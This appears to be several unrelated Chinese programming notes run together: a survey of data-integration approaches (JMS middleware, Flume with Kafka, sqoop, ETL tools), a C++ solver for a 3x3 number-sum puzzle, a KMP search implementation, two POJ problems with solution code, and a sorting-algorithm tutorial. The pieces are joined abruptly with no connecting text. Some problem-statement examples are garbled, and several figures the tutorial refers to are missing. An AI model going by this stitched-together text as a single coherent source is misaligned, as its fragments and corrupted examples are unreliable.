系统A和系统B通过一个消息服务器进行数据交换。系统A发送消息到消息服务器，如果系统B订阅系统A发送过来的消息，消息服务器会消息推送给B。双方约定消息格式即可。目前市场上有很多开源的jms消息中间件，比如  使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，MetaMQ，RocketMQ等
优点：
1 由于jms定义了规范，有很多的开源的消息中间件可以选择，而且比较通用。接入起来相对也比较简单
2 通过消息方式比较灵活，可以采取同步，异步，可靠性的消息处理，消息中间件也可以独立出来部署。
缺点：
1.学习jms相关的基础知识，消息中间件的具体配置，以及实现的细节对于开发人员来说还是有一点学习成本的
2 在大数据量的情况下，消息可能会产生积压，导致消息延迟，消息丢失，甚至消息中间件崩溃。
Flume+kafka
Flume作为日志收集工具，监控一个文件目录或者一个文件，当有新数据加入时，收集新数据发送给Kafka。Kafka用来做数据缓存和消息订阅。Kafka里面的消息可以定时落地到HDFS上，也可以用Spark Streaming来做实时处理，然后将处理后的数据落地到HDFS上。
Flume采集数据都是按行分割的，一行代表一条记录。如果原始数据不符合要求，需要对数据进行预处理。
数据库文件
1.Imp/exp方式使用dmp文件直接导入目标库
2.sqoop 关系型数据库与hadoop生态系统（hive,hdfs）进行数据转移
ETL（Extract-Transform-Load ）工具：构建数据仓库
用户从数据源抽取出所需的数据，经过数据清洗，最终按照预先定义好的数据仓库模型，将数据加载到数据仓库中去
Apache Camel、Apache Kafka、Apatar、Heka、Logstash、Scriptella、Talend、Kettle
2.接入技术选择
1.ETL工具
（Extract-Transform-Load ）
2.定制研发


参考文献
《数据平台的实践及思考》 杨剑飞







﻿﻿
x     x     x 11
x     x     x 15
x     x     x 19
16  14   15 15

讨论贴：
http://bbs.csdn.net/topics/391816265

先求横竖斜三行的精确匹配方法：
// puzzl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

// puzzle.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <vector>
#include <set>
#include <iostream>

using namespace std;

int result[3][3] = {0};

bool check(int a, int b, int c, int sum)
{
 if((a + b  + c )== sum)
  return true;
 else 
  return false;
}

int lastValue(int a, int b,int sum)
{
 return (sum - a - b);
}

//min max
vector<vector<int> > zuhe(int min,int max,int sum)
{

 vector<vector<int> > quanji;
 for(int i = min;i < max; ++i)
 { 
  for(int j = 1;j < max; ++j)
  {
   if(i + j > sum)
    continue;
   else
   {
    for(int k = 1; k <max ;++k)
    {
     if(check(i,j,k,sum))
     {
      vector<int> ziji;
      ziji.push_back(i);
      ziji.push_back(j);
      ziji.push_back(k);
      if (i!=j&&j!=k&&i!=k)
      {
       quanji.push_back(ziji);
      }
      
      
     }
     else
     {
      continue;
     }
    }
   }
  }

 }

 return quanji;
}

vector<vector<int> > filter_zuhe(int key,vector<vector<int> > temp)
{
 vector<vector<int> >::iterator iter ;
 for(iter = temp.begin(); iter!=temp.end(); )
 {
  if( (*iter)[0] != key)
   iter = temp.erase(iter);
  else
   iter ++ ;
 }

 return temp;
}


bool isOk()
{
	set<int> mySet;

	for(int i = 0;i <3; ++i)
	{
		for(int j = 0;j<3;++j)
		{
			if(result[i][j]>0&&result[i][j]<10)
			{
				mySet.insert(result[i][j]);
			}
		}
	}

	if(mySet.size()!=9)
	{return false;}
	else
	{
		if(mySet.size()==9)
		{
			for(int i = 0;i <3; ++i)
			{
				cout <<endl;
				for(int j = 0;j<3;++j)
				{
					cout<<result[i][j]<<" ";
				}
			}

			return true;
		}
	}
}

void dayin()
{
	for(int i = 0;i <3; ++i)
			{
				cout <<endl;
				for(int j = 0;j<3;++j)
				{
					cout<<result[i][j]<<" ";
				}
			}

	cout<<endl;
}

void qingling()
{
	for(int i = 0;i <3; ++i)
	{
		for(int j = 0;j<3;++j)
		{
			(result[i][j]=0);
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
 vector<vector<int> > quanjiheng = zuhe(1,9,11);
 vector<vector<int> > quanjishu = zuhe(1,9,16);
 vector<vector<int> > quanjixie = zuhe(1,9,15);

 int sizeheng = quanjiheng.size();
 int sizeshu = quanjishu.size();
 int sizexie = quanjixie.size();

 int key = 0,last_key = 0;

 vector<vector<int> > quanjishufilter;
 vector<vector<int> > quanjixiefilter;

 for(int i = 0;i < sizeheng ; ++i)
 {
	   key = quanjiheng[i][0];
	   if (key!=last_key)
	   {
		quanjishufilter = filter_zuhe(key,quanjishu);
		quanjixiefilter = filter_zuhe(key,quanjixie);
	   }
	   last_key = key;
	   //给横行赋值
	  for (int j = 0;j< 3;++j)
	  {
	   result[0][j] = quanjiheng[i][j];
	  
	  }
  
	  int sizeshu = quanjishufilter.size();
	  for (int k = 0; k< sizeshu;++k)
	  {
		  //给竖行赋值
		  for(int j = 0;j<3;++j)
		  {
			   result[j][0] = quanjishufilter[k][j];
		  }

		  int sizexie = quanjixiefilter.size();
		  for(int x = 0; x < sizexie; ++x)
		  {
			  for(int j = 0; j < 3 ;++j)
			  {
				  result[j][j] = quanjixiefilter[x][j];
			  }
				result[2][1] = 14 - result[0][1]-result[1][1];
				result[1][2] = 15-  result[1][0]-result[1][1];
				if(isOk())
				{
					//dayin();
					getchar();
					//return 0;
				}
				else
				{
					
					
				}
		  }

	
	 }

   qingling();
  
 }
 

 getchar();
 system("pause");
 return 0;
}









排列组合的方法：


template <typename T>
void swap(T* array, unsigned int i, unsigned int j)
{
	T t = array[i];
	array[i] = array[j];
	array[j] = t;
}

void FullArray(int* array, size_t array_size, unsigned int index)
{
	if (index >= array_size)
	{
		if ((array[0] + array[1] + array[2] == 11) &&
			(array[3] + array[4] + array[5] == 15) &&
			(array[6] + array[7] + array[8] == 19) && 
			(array[0] + array[3] + array[6] == 16) &&
			(array[1] + array[4] + array[7] == 14) &&
			(array[2] + array[5] + array[8] == 15) &&
			(array[0] + array[4] + array[8] == 15))
		{
			printf("%d,%d,%d\n", array[0], array[1], array[2]);
			printf("%d,%d,%d\n", array[3], array[4], array[5]);
			printf("%d,%d,%d\n\n", array[6], array[7], array[8]);
		}

		return;
	}

	for (unsigned int i = index; i < array_size; ++i)
	{
		swap(array, i, index);

		FullArray(array, array_size, index + 1);

		swap(array, i, index);
	}
}

int main(int argc, char* argv[])
{
	int value[9] = { 1, 2, 3, 4, 5, 6, 7, 8, 9 };
	
	FullArray(value, 9, 0);
}



模仿人做的方法，任意填写3个空位，保证不同行不同列，或者不在一个斜线。就可以算出来剩下的。






 
 代码来自：
 
http://blog.csdn.net/v_JULY_v
 
#include "StdAfx.h"
#include <iostream>

using namespace std;

void GetNextval(char* p, int* next)
{
	int pLen = strlen(p);
	next[0] = -1;
	int k = -1;
	int j = 0;
	while (j < pLen - 1)
	{
		//p[k]表示前缀，p[j]表示后缀  
		if (k == -1 || p[j] == p[k])
		{
			++j;
			++k;
			//较之前next数组求法，改动在下面4行
			if (p[j] != p[k])
				next[j] = k;   //之前只有这一行
			else
				//因为不能出现p[j] = p[ next[j ]]，所以当出现时需要继续递归，k = next[k] = next[next[k]]
				next[j] = next[k];
		}
		else
		{
			k = next[k];
		}
	}
}

int KmpSearch(char* s, char* p)
{
	int i = 0;
	int j = 0;
	int sLen = strlen(s);
	int pLen = strlen(p);
	int* next = new int[pLen];
	

	GetNextval(p,next);
	while (i < sLen && j < pLen)
	{
		//①如果j = -1，或者当前字符匹配成功（即S[i] == P[j]），都令i++，j++    
		if (j == -1 || s[i] == p[j])
		{
			i++;
			j++;
		}
		else
		{
			//②如果j != -1，且当前字符匹配失败（即S[i] != P[j]），则令 i 不变，j = next[j]    
			//next[j]即为j所对应的next值      
			j = next[j];
		}
	}
	if (j == pLen)
		return i - j;
	else
		return -1;
}

int main()
{
	char* s = "a is a good girl";
	char* p = "good";

	cout<<"we can find the word in the position:"<<KmpSearch(s,p)<<endl;
	getchar();
	return 0;
}



 








Parencodings

Time Limit: 1000MS
 
Memory Limit: 10000K
Total Submissions: 24202
 
Accepted: 14201


Description

Let S = s1 s2...s2n be a well-formed string of parentheses. S can be encoded in two different ways: 
q By an integer sequence P = p1 p2...pn where pi is the number of left parentheses before the ith right parenthesis in S (P-sequence). 
q By an integer sequence W = w1 w2...wn where for each right parenthesis, say a in S, we associate an integer which is the number of right parentheses counting from the matched left parenthesis of a up to a. (W-sequence). 
Following is an example of the above encodings: 	S		(((()()())))

	P-sequence	    4 5 6666

	W-sequence	    1 1 1456



Write a program to convert P-sequence of a well-formed string to the W-sequence of the same string. 
Input

The first line of the input contains a single integer t (1 <= t <= 10), the number of test cases, followed by the input data for each test case. The first line of each test case is an integer n (1 <= n <= 20), and the second line is the P-sequence of a well-formed
 string. It contains n positive integers, separated with blanks, representing the P-sequence.
Output

The output file consists of exactly t lines corresponding to test cases. For each test case, the output line should contain n integers describing the W-sequence of the string corresponding to its given P-sequence.
Sample Input
2
6
4 5 6 6 6 6
9 
4 6 6 6 6 8 9 9 9

Sample Output
1 1 1 4 5 6
1 1 2 4 5 1 1 3 9
Source


http://blog.csdn.net/xinghongduo/article/details/6174671

http://blog.chinaunix.net/uid-22609852-id-3506161.html

ac代码：

#include <stdio.h>
#include <stdlib.h>
char c_kuohao[10000] = {0};

//生成空格匹配的字符串
void genkuohao(char* c_kuohao,int* array,int arraylength )
{
	int cur_index = 0;
	for (int i = 0; i< arraylength-1;i++)
	{
		int j ;
		for ( j = 0;j <*(array+i+1)- *(array +i);j++)
		{
			c_kuohao[cur_index + j] = '(';

		}
		c_kuohao[cur_index + j ] = ')';
		cur_index = cur_index + j +1;
	}
}

//从括号字符串中，获取int 数组
//找到一个右括号，把匹配最近的左括号设置为字符1，并生成对应的rarray数组
void getWarray(char* c_kuohao,int* rarray,int arraylength)
{
	int index = 0;
	int i = 0;
	while(c_kuohao[i]!=0)
	{
		if (c_kuohao[i] ==')')
		{
			int j = i-1;
			while(c_kuohao[j]!='(')
			{
				j--;
				if (c_kuohao[j] == '1')
				{
					*(rarray + index) += 1;
				}
				
			}
			*(rarray + index) += 1;
			c_kuohao[j] ='1' ;
			index++;
			i++;
		}
		else
		{
			i++;
		}

	}
}

void main()
{


	//freopen("sample.in", "r", stdin);
	//freopen("sample.out", "w", stdout);

	/* 同控制台输入输出 */
	int mainIndex = 0;
	scanf("%d",&mainIndex);

	for (int i = 0; i < mainIndex;i++)
	{

		int N = 0;
		scanf("%d",&N);
		// 下面申请内存时候要用sizeof不然free时候会算错导致堆出错
		int *array = (int*)malloc(sizeof(int)*(N +1));
		int *rarray = (int*)malloc(sizeof(int)*N);
		//给数组第一个位置放个0
		*(array+0) = 0;
		

		for (int j = 1;j<=N;j++)
		{
			scanf("%d",array+j);
			*(rarray + j-1) =0;
			
		}

		for (int k = 0;k<10000;k++)
		{
			c_kuohao[k] = 0;
		}
		
		genkuohao(c_kuohao,array,N+1);
		getWarray(c_kuohao,rarray,N);

		for (int z = 0;z<N;z++)
		{
			printf("%d ",*(rarray + z));
		}
		
		printf("\n");

		free(array);
		free(rarray);
	}

}再分享一个非常短的代码：
http://blog.csdn.net/qingniaofy/article/details/7701626








Image Perimeters

Time Limit: 1000MS
 
Memory Limit: 10000K
Total Submissions: 8632
 
Accepted: 5168


Description

Technicians in a pathology lab analyze digitized images of slides. Objects on a slide are selected for analysis by a mouse click on the object. The perimeter of the boundary of an object is one useful measure. Your task is to determine this perimeter for selected
 objects. 
The digitized slides will be represented by a rectangular grid of periods, '.', indicating empty space, and the capital letter 'X', indicating part of an object. Simple examples are XX   Grid 1       .XXX   Grid 2 

XX                .XXX 

                  .XXX 

                  ...X 

                  ..X. 

                  X... 

An X in a grid square indicates that the entire grid square, including its boundaries, lies in some object. The X in the center of the grid below is adjacent to the X in any of the 8 positions around it. The grid squares for any two adjacent X's overlap on
 an edge or corner, so they are connected. XXX 

XXX    Central X and adjacent X's 

XXX 

An object consists of the grid squares of all X's that can be linked to one another through a sequence of adjacent X's. In Grid 1, the whole grid is filled by one object. In Grid 2 there are two objects. One object contains only the lower left grid square.
 The remaining X's belong to the other object. 
The technician will always click on an X, selecting the object containing that X. The coordinates of the click are recorded. Rows and columns are numbered starting from 1 in the upper left hand corner. The technician could select the object in Grid 1 by clicking
 on row 2 and column 2. The larger object in Grid 2 could be selected by clicking on row 2, column 3. The click could not be on row 4, column 3. 

One useful statistic is the perimeter of the object. Assume each X corresponds to a square one unit on each side. Hence the object in Grid 1 has perimeter 8 (2 on each of four sides). The perimeter for the larger object in Grid 2 is illustrated in the figure
 at the left. The length is 18. 
Objects will not contain any totally enclosed holes, so the leftmost grid patterns shown below could NOT appear. The variations on the right could appear: Impossible   Possible 



XXXX         XXXX   XXXX   XXXX 

X..X         XXXX   X...   X... 

XX.X         XXXX   XX.X   XX.X 

XXXX         XXXX   XXXX   XX.X 



.....        .....  .....  ..... 

..X..        ..X..  ..X..  ..X.. 

.X.X.        .XXX.  .X...  ..... 

..X..        ..X..  ..X..  ..X.. 

.....        .....  .....  ..... 

Input

The input will contain one or more grids. Each grid is preceded by a line containing the number of rows and columns in the grid and the row and column of the mouse click. All numbers are in the range 1-20. The rows of the grid follow, starting on the next line,
 consisting of '.' and 'X' characters. 
The end of the input is indicated by a line containing four zeros. The numbers on any one line are separated by blanks. The grid rows contain no blanks. 
Output

For each grid in the input, the output contains a single line with the perimeter of the specified object.
Sample Input
2 2 2 2
XX
XX
6 4 2 3
.XXX
.XXX
.XXX
...X
..X.
X...
5 6 1 3
.XXXX.
X....X
..XX.X
.X...X
..XXX.
7 7 2 6
XXXXXXX
XX...XX
X..X..X
X..X...
X..X..X
X.....X
XXXXXXX
7 7 4 4
XXXXXXX
XX...XX
X..X..X
X..X...
X..X..X
X.....X
XXXXXXX
0 0 0 0
Sample Output
8
18
40
48
8


http://blog.csdn.net/palqing/article/details/6262594

思路：搜索，过程中把该块上所有的X旁边有几个点是".",把所有的点旁边的"."数加起来就是总连长了。


#include<iostream>
#include<string.h>
using namespace std;
char Mp[30][30];
int dir[8][2]={{1,0},{-1,0},{0,1},{0,-1},{1,1},{1,-1},{-1,1},{-1,-1}};
int DFS(int r,int c)
{
	if(Mp[r][c]=='.'||Mp[r][c]=='n') return 0;
	Mp[r][c]='n';
	int sum=0;
	for(int i=0;i!=4;i++)
		sum+=(Mp[r+dir[i][0]][c+dir[i][1]]=='.');
	for(int i=0;i!=8;i++)
		sum+=DFS(r+dir[i][0],c+dir[i][1]);
	return sum;
}
int main()
{
	int row,col,r,c;
	while(cin>>row>>col>>r>>c && row)
	{
		memset(Mp,'.',sizeof(Mp));
		for(int i=1;i<=row;i++)
			for(int j=1; j<=col;j++)
				cin>>Mp[i][j];
		cout<<DFS(r,c)<<endl;
	}
}






 
概述
排序有内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。
我们这里说说八大排序就是内部排序。

    当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。
   快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；
1.插入排序—直接插入排序(Straight Insertion Sort)
基本思想:
将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第2个记录逐个进行插入，直至整个序列有序为止。
要点：设立哨兵，作为临时存储和判断数组边界之用。
直接插入排序示例：

如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是稳定的。
算法的实现： 
void print(int a[], int n ,int i){
	cout<<i <<":";
	for(int j= 0; j<8; j++){
		cout<<a[j] <<" ";
	}
	cout<<endl;
}


void InsertSort(int a[], int n)
{
	for(int i= 1; i<n; i++){
		if(a[i] < a[i-1]){               //若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入
			int j= i-1;	
			int x = a[i];		 //复制为哨兵，即存储待排序元素
			a[i] = a[i-1];           //先后移一个元素
			while(x < a[j]){	 //查找在有序表的插入位置
				a[j+1] = a[j];
				j--;		 //元素后移
			}
			a[j+1] = x;		 //插入到正确位置
		}
		print(a,n,i);			//打印每趟排序的结果
	}
	
}

int main(){
	int a[8] = {3,1,5,7,2,4,9,6};
	InsertSort(a,8);
	print(a,8,8);
}

效率：
时间复杂度：O（n^2）.
其他的插入排序有二分插入排序，2-路插入排序。
2. 插入排序—希尔排序（Shell`s Sort）
希尔排序是1959 年由D.L.Shell 提出来的，相对直接排序有较大的改进。希尔排序又叫缩小增量排序
基本思想：
先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。
操作方法：
选择一个增量序列t1，t2，…，tk，其中ti>tj，tk=1； 按增量序列个数k，对序列进行k 趟排序； 每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。希尔排序的示例：

算法实现：
我们简单处理增量序列：增量序列d = {n/2 ,n/4, n/8 .....1} n为要排序数的个数
即：先将要排序的一组记录按某个增量d（n/2,n为要排序数的个数）分成若干组子序列，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。继续不断缩小增量直至为1，最后使用直接插入排序完成排序。
void print(int a[], int n ,int i){
	cout<<i <<":";
	for(int j= 0; j<8; j++){
		cout<<a[j] <<" ";
	}
	cout<<endl;
}
/**
 * 直接插入排序的一般形式
 *
 * @param int dk 缩小增量，如果是直接插入排序，dk=1
 *
 */

void ShellInsertSort(int a[], int n, int dk)
{
	for(int i= dk; i<n; ++i){
		if(a[i] < a[i-dk]){			//若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入
			int j = i-dk;	
			int x = a[i];			//复制为哨兵，即存储待排序元素
			a[i] = a[i-dk];			//首先后移一个元素
			while(x < a[j]){		//查找在有序表的插入位置
				a[j+dk] = a[j];
				j -= dk;			 //元素后移
			}
			a[j+dk] = x;			//插入到正确位置
		}
		print(a, n,i );
	}
	
}

/**
 * 先按增量d（n/2,n为要排序数的个数进行希尔排序
 *
 */
void shellSort(int a[], int n){

	int dk = n/2;
	while( dk >= 1  ){
		ShellInsertSort(a, n, dk);
		dk = dk/2;
	}
}
int main(){
	int a[8] = {3,1,5,7,2,4,9,6};
	//ShellInsertSort(a,8,1); //直接插入排序
	shellSort(a,8);			  //希尔插入排序
	print(a,8,8);
}
 
 
希尔排序时效分析很难，关键码的比较次数与记录移动次数依赖于增量因子序列d的选取，特定情况下可以准确估算出关键码的比较次数和记录的移动次数。目前还没有人给出选取最好的增量因子序列的方法。增量因子序列可以有各种取法，有取奇数的，也有取质数的，但需要注意：增量因子中除1 外没有公因子，且最后一个增量因子必须为1。希尔排序方法是一个不稳定的排序方法。
 
 
3. 选择排序—简单选择排序（Simple Selection Sort）
基本思想：
在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。
简单选择排序的示例：

操作方法：
第一趟，从n 个记录中找出关键码最小的记录与第一个记录交换；
第二趟，从第二个记录开始的n-1 个记录中再选出关键码最小的记录与第二个记录交换；
以此类推.....
第i 趟，则从第i 个记录开始的n-i+1 个记录中选出关键码最小的记录与第i 个记录交换，
直到整个序列按关键码有序。
算法实现：
void print(int a[], int n ,int i){
	cout<<"第"<<i+1 <<"趟 : ";
	for(int j= 0; j<8; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl;
}
/**
 * 数组的最小值
 *
 * @return int 数组的键值
 */
int SelectMinKey(int a[], int n, int i)
{
	int k = i;
	for(int j=i+1 ;j< n; ++j) {
		if(a[k] > a[j]) k = j;
	}
	return k;
}

/**
 * 选择排序
 *
 */
void selectSort(int a[], int n){
	int key, tmp;
	for(int i = 0; i< n; ++i) {
		key = SelectMinKey(a, n,i);           //选择最小的元素
		if(key != i){
			tmp = a[i];  a[i] = a[key]; a[key] = tmp; //最小元素与第i位置元素互换
		}
		print(a,  n , i);
	}
}
int main(){
	int a[8] = {3,1,5,7,2,4,9,6};
	cout<<"初始值：";
	for(int j= 0; j<8; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl<<endl;
	selectSort(a, 8);
	print(a,8,8);
}
简单选择排序的改进——二元选择排序
简单选择排序，每趟循环只能确定一个元素排序后的定位。我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n/2]趟循环即可。具体实现如下：
 
 
 
 
void SelectSort(int r[],int n) {
	int i ,j , min ,max, tmp;
	for (i=1 ;i <= n/2;i++) {  
		// 做不超过n/2趟选择排序 
		min = i; max = i ; //分别记录最大和最小关键字记录位置
		for (j= i+1; j<= n-i; j++) {
			if (r[j] > r[max]) { 
				max = j ; continue ; 
			}  
			if (r[j]< r[min]) { 
				min = j ; 
			}   
	  }  
	  //该交换操作还可分情况讨论以提高效率
	  tmp = r[i-1]; r[i-1] = r[min]; r[min] = tmp;
	  tmp = r[n-i]; r[n-i] = r[max]; r[max] = tmp; 

	} 
}
 
 
4. 选择排序—堆排序（Heap Sort）
堆排序是一种树形选择排序，是对直接选择排序的有效改进。
基本思想：
堆的定义如下：具有n个元素的序列（k1,k2,...,kn),当且仅当满足

时称之为堆。由堆的定义可以看出，堆顶元素（即第一个元素）必为最小项（小顶堆）。 
若以一维数组存储一个堆，则堆对应一棵完全二叉树，且所有非叶结点的值均不大于(或不小于)其子女的值，根结点（堆顶元素）的值是最小(或最大)的。如：
（a）大顶堆序列：（96, 83,27,38,11,09)
  (b)  小顶堆序列：（12，36，24，85，47，30，53，91）

初始时把要排序的n个数的序列看作是一棵顺序存储的二叉树（一维数组存储二叉树），调整它们的存储序，使之成为一个堆，将堆顶元素输出，得到n 个元素中最小(或最大)的元素，这时堆的根节点的数最小（或者最大）。然后对前面(n-1)个元素重新调整使之成为堆，输出堆顶元素，得到n 个元素中次小(或次大)的元素。依此类推，直到只有两个节点的堆，并对它们作交换，最后得到有n个节点的有序序列。称这个过程为堆排序。
因此，实现堆排序需解决两个问题： 
1. 如何将n 个待排序的数建成堆； 
2. 输出堆顶元素后，怎样调整剩余n-1 个元素，使其成为一个新堆。
首先讨论第二个问题：输出堆顶元素后，对剩余n-1元素重新建成堆的调整过程。 
调整小顶堆的方法：
1）设有m 个元素的堆，输出堆顶元素后，剩下m-1 个元素。将堆底元素送入堆顶（（最后一个元素与堆顶进行交换），堆被破坏，其原因仅是根结点不满足堆的性质。
2）将根结点与左、右子树中较小元素的进行交换。
3）若与左子树交换：如果左子树堆被破坏，即左子树的根结点不满足堆的性质，则重复方法 （2）.
4）若与右子树交换，如果右子树堆被破坏，即右子树的根结点不满足堆的性质。则重复方法 （2）.
5）继续对不满足堆性质的子树进行上述交换操作，直到叶子结点，堆被建成。
称这个自根结点到叶子结点的调整过程为筛选。如图：

再讨论对n 个元素初始建堆的过程。 
建堆方法：对初始序列建堆的过程，就是一个反复进行筛选的过程。
1）n 个结点的完全二叉树，则最后一个结点是第个结点的子树。
2）筛选从第个结点为根的子树开始，该子树成为堆。
3）之后向前依次对各结点为根的子树进行筛选，使之成为堆，直到根结点。
如图建堆初始过程：无序序列：（49，38，65，97，76，13，27，49） 

算法的实现：
从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。
 
 
 
 
void print(int a[], int n){
	for(int j= 0; j<n; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl;
}



/**
 * 已知H[s…m]除了H[s] 外均满足堆的定义
 * 调整H[s],使其成为大顶堆.即将对第s个结点为根的子树筛选, 
 *
 * @param H是待调整的堆数组
 * @param s是待调整的数组元素的位置
 * @param length是数组的长度
 *
 */
void HeapAdjust(int H[],int s, int length)
{
	int tmp  = H[s];
	int child = 2*s+1; //左孩子结点的位置。(i+1 为当前调整结点的右孩子结点的位置)
    while (child < length) {
		if(child+1 <length && H[child]<H[child+1]) { // 如果右孩子大于左孩子(找到比当前待调整结点大的孩子结点)
			++child ;
		}
		if(H[s]<H[child]) {  // 如果较大的子结点大于父结点
			H[s] = H[child]; // 那么把较大的子结点往上移动，替换它的父结点
			s = child;		 // 重新设置s ,即待调整的下一个结点的位置
			child = 2*s+1;
		}  else {			 // 如果当前待调整结点大于它的左右孩子，则不需要调整，直接退出
			 break;
		}
		H[s] = tmp;			// 当前待调整的结点放到比其大的孩子结点位置上
	}
	print(H,length);
}


/**
 * 初始堆进行调整
 * 将H[0..length-1]建成堆
 * 调整完之后第一个元素是序列的最小的元素
 */
void BuildingHeap(int H[], int length)
{ 
	//最后一个有孩子的节点的位置 i=  (length -1) / 2
	for (int i = (length -1) / 2 ; i >= 0; --i)
		HeapAdjust(H,i,length);
}
/**
 * 堆排序算法
 */
void HeapSort(int H[],int length)
{
    //初始堆
	BuildingHeap(H, length);
	//从最后一个元素开始对序列进行调整
	for (int i = length - 1; i > 0; --i)
	{
		//交换堆顶元素H[0]和堆中最后一个元素
		int temp = H[i]; H[i] = H[0]; H[0] = temp;
		//每次交换堆顶元素和堆中最后一个元素之后，都要对堆进行调整
		HeapAdjust(H,0,i);
  }
} 

int main(){
	int H[10] = {3,1,5,7,2,4,9,6,10,8};
	cout<<"初始值：";
	print(H,10);
	HeapSort(H,10);
	//selectSort(a, 8);
	cout<<"结果：";
	print(H,10);

}
分析: 
设树深度为k，。从根到叶的筛选，元素比较次数至多2(k-1)次，交换记录至多k 次。所以，在建好堆后，排序过程中的筛选次数不超过下式：

而建堆时的比较次数不超过4n 次，因此堆排序最坏情况下，时间复杂度也为：O(nlogn )。
5. 交换排序—冒泡排序（Bubble Sort）
基本思想：
在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。
冒泡排序的示例：

 
 
算法的实现：
void bubbleSort(int a[], int n){
	for(int i =0 ; i< n-1; ++i) {
		for(int j = 0; j < n-i-1; ++j) {
			if(a[j] > a[j+1])
			{
				int tmp = a[j] ; a[j] = a[j+1] ;  a[j+1] = tmp;
			}
		}
	}
}
冒泡排序算法的改进
对冒泡排序常见的改进方法是加入一标志性变量exchange，用于标志某一趟排序过程中是否有数据交换，如果进行某一趟排序时并没有进行数据交换，则说明数据已经按要求排列好，可立即结束排序，避免不必要的比较过程。本文再提供以下两种改进算法：
1．设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于pos位置之后的记录均已交换到位,故在进行下一趟排序时只要扫描到pos位置即可。
改进后算法如下:
 
 
void Bubble_1 ( int r[], int n) {
	int i= n -1;  //初始时,最后位置保持不变
	while ( i> 0) { 
		int pos= 0; //每趟开始时,无记录交换
		for (int j= 0; j< i; j++)
			if (r[j]> r[j+1]) {
				pos= j; //记录交换的位置 
				int tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp;
			} 
		i= pos; //为下一趟排序作准备
	 } 
}  
2．传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者) , 从而使排序趟数几乎减少了一半。
改进后的算法实现为:
 
 
void Bubble_2 ( int r[], int n){
	int low = 0; 
	int high= n -1; //设置变量的初始值
	int tmp,j;
	while (low < high) {
		for (j= low; j< high; ++j) //正向冒泡,找到最大者
			if (r[j]> r[j+1]) {
				tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp;
			} 
		--high;					//修改high值, 前移一位
		for ( j=high; j>low; --j) //反向冒泡,找到最小者
			if (r[j]<r[j-1]) {
				tmp = r[j]; r[j]=r[j-1];r[j-1]=tmp;
			}
		++low;					//修改low值,后移一位
	} 
} 
6. 交换排序—快速排序（Quick Sort）
基本思想：
1）选择一个基准元素,通常选择第一个元素或者最后一个元素,
2）通过一趟排序讲待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。
3）此时基准元素在其排好序后的正确位置
4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。
快速排序的示例：
（a）一趟排序的过程：

（b）排序的全过程

算法的实现：
 
 
递归实现：
void print(int a[], int n){
	for(int j= 0; j<n; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl;
}

void swap(int *a, int *b)
{
	int tmp = *a;
	*a = *b;
	*b = tmp;
}

int partition(int a[], int low, int high)
{
	int privotKey = a[low];								//基准元素
	while(low < high){								    //从表的两端交替地向中间扫描
		while(low < high  && a[high] >= privotKey) --high;  //从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端
		swap(&a[low], &a[high]);
		while(low < high  && a[low] <= privotKey ) ++low;
		swap(&a[low], &a[high]);
	}
	print(a,10);
	return low;
}


void quickSort(int a[], int low, int high){
	if(low < high){
		int privotLoc = partition(a,  low,  high);  //将表一分为二
		quickSort(a,  low,  privotLoc -1);			//递归对低子表递归排序
		quickSort(a,   privotLoc + 1, high);		//递归对高子表递归排序
	}
}

int main(){
	int a[10] = {3,1,5,7,2,4,9,6,10,8};
	cout<<"初始值：";
	print(a,10);
	quickSort(a,0,9);
	cout<<"结果：";
	print(a,10);

}
分析：
快速排序是通常被认为在同数量级（O(nlog2n)）的排序方法中平均性能最好的。但若初始序列按关键码有序或基本有序时，快排序反而蜕化为冒泡排序。为改进之，通常以“三者取中法”来选取基准记录，即将排序区间的两个端点与中点三个记录关键码居中的调整为支点记录。快速排序是一个不稳定的排序方法。
